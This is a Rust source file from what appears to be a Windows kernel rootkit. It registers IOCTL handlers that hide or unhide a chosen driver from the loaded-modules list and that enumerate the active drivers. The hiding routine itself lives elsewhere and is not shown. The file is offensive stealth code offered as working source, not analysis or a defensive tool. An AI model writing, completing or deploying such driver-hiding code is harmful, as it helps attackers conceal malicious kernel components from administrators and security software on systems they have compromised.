use {
    crate::{driver::Driver, handle_driver, utils::ioctls::IoctlHandler}, alloc::boxed::Box, hashbrown::HashMap, shared::{ioctls::{IOCTL_ENUMERATE_DRIVER, IOCTL_HIDE_UNHIDE_DRIVER}, structs::{DriverInfo, TargetDriver}}, wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS}
};

pub fn get_driver_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {

    // Hiding / Unhiding a driver from loaded modules.
    ioctls.insert(IOCTL_HIDE_UNHIDE_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_HIDE_UNHIDE_DRIVER");
        let status = unsafe { handle_driver!(stack, Driver::driver_toggle, TargetDriver) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);

    // Enumerate active drivers on the system.
    ioctls.insert(IOCTL_ENUMERATE_DRIVER, Box::new(|irp: *mut IRP, _: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_ENUMERATE_DRIVER");
        
        let mut information = 0;
        let status = unsafe { handle_driver!(irp, Driver::enumerate_driver, DriverInfo, &mut information) };
        
        unsafe { (*irp).IoStatus.Information = information as u64 };

        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);
}